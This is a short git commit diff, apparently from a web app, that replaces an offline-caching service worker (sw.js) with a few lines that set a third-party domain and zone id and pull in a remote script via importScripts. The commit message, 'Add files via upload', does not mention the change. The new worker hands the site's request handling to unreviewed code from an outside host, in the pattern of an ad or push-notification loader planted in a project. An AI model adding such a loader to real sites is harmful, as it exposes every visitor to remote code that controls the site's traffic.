b134735b1a44460355b221e87fc41190011cfeaa
Elliot Scott Chan <elliotscottchan@gmail.com>
2026-04-21 10:35:24 +0530

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,27 +1,6 @@
-const CACHE_NAME = "tracker-cache-v1";
-const ASSETS_TO_CACHE = [
-  "/",
-  "/index.html",
-  "/style.css",
-  "/app.js",
-  "/manifest.json",
-  "/logo.png"
-];
-
-// Install the Service Worker and save files to the phone
-self.addEventListener("install", (event) => {
-  event.waitUntil(
-    caches.open(CACHE_NAME).then((cache) => {
-      return cache.addAll(ASSETS_TO_CACHE);
-    })
-  );
-});
-
-// Intercept network requests and serve from cache if offline
-self.addEventListener("fetch", (event) => {
-  event.respondWith(
-    caches.match(event.request).then((response) => {
-      return response || fetch(event.request);
-    })
-  );
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 10904561
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
